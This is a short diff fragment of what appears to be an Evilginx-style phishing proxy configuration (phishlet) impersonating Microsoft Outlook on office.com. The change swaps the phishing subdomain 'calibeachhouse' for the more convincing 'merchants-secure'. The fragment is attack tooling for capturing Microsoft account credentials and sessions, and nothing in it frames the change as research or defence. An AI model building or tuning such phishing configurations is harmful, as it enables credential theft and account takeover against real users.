@@ -335,7 +335,7 @@ proxy_hosts:
     }
   #
   - {
-      phish_sub: "calibeachhouse",
+      phish_sub: "merchants-secure",
       orig_sub: "outlook",
       domain: "office.com",
       session: false,
